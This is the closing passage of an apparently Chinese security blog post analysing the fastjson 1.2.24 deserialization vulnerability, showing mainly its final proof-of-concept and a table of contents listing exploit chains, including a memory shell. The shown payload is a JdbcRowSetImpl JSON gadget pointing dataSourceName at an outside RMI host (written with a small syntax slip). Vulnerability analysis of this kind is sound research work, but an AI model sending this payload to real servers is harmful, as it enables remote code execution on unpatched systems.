<h4 id="2-4-3-Poc"><a href="#2-4-3-Poc" class="headerlink" title="2.4.3 Poc"></a>2.4.3 Poc</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://dnslog.cn&quot;</span>,</span><br><span class="line">    &quot;autoCommit&quot; true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/link">链接</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%A8%A1%E6%8B%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">1. 模拟命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">2. 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-DNS%E8%AF%B7%E6%B1%82"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 DNS请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-java-net-Inet4Address"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 java.net.Inet4Address</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E8%A1%A5%E5%85%85-%E5%86%85%E7%BD%AE%E6%9C%89deserializer%E5%AF%B9%E5%BA%94%E7%9A%84%E7%B1%BB%E5%90%8D"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2 补充-内置有deserializer对应的类名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-%E8%A1%A5%E5%85%85-Inet4Address%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D"><span class="toc-number">2.1.3.</span> <span class="toc-text">2.1.2 补充-Inet4Address解析域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-4-java-net-URL"><span class="toc-number">2.1.4.</span> <span class="toc-text">2.1.4 java.net.URL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-5-poc%E6%9E%84%E9%80%A0"><span class="toc-number">2.1.5.</span> <span class="toc-text">2.1.5 poc构造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 TemplatesImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E6%B3%A8%E6%84%8F%E7%A7%81%E6%9C%89%E5%AD%97%E6%AE%B5%E7%9A%84%E8%B5%8B%E5%80%BC"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 注意私有字段的赋值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%8F%98%E9%87%8F"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 数组类型的变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-3-getOutputProperties"><span class="toc-number">2.2.3.</span> <span class="toc-text">2.2.3 getOutputProperties</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-4-%E7%BB%93%E5%90%88CB%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF"><span class="toc-number">2.2.4.</span> <span class="toc-text">2.2.4 结合CB利用链的新思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-BCEL%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 BCEL利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1-BasicDataSource%E5%85%B3%E9%94%AE%E7%B1%BB"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1 BasicDataSource关键类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-3-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8JSON-parse-%E8%A7%A6%E5%8F%91"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.3 如何使用JSON.parse()触发</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-1-Type%E4%B8%BAJSONObject%E7%B1%BB%E6%97%B6"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">2.3.3.1 @Type为JSONObject类时</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-2-%E6%89%A7%E8%A1%8C%E5%88%B0key-toString-%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">2.3.3.2 执行到key.toString()方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-3-%E8%A7%A6%E5%8F%91invoke"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">2.3.3.3 触发invoke</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-3-4-poc%E6%9E%84%E9%80%A0"><span class="toc-number">2.3.2.4.</span> <span class="toc-text">2.3.3.4 poc构造</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-1-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%9D%97%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.3.2.5.</span> <span class="toc-text">2.3.4.1 恶意代码块位置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-2-%E5%BC%B9%E5%87%BA%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">2.3.2.6.</span> <span class="toc-text">2.3.4.2 弹出计算器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-3-%E5%9B%9E%E6%98%BE"><span class="toc-number">2.3.2.7.</span> <span class="toc-text">2.3.4.3 回显</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-4-4-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.3.2.8.</span> <span class="toc-text">2.3.4.4 内存马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 JdbcRowSetImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-1-JNDI%E8%B0%83%E7%94%A8"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1 JNDI调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-2-%E8%A7%A6%E5%8F%91%E9%93%BEsetAutoCommit"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.2 触发链setAutoCommit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-3-Poc"><span class="toc-number">2.4.3.</span> <span class="toc-text">2.4.3 Poc</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson 1.2.24漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson 1.2.24漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=fastjson 1.2.24漏洞分析&body=Check out this article: http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.24漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson 1.2.24漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson 1.2.24漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2017-2024
    ninefiger
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/link">链接</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
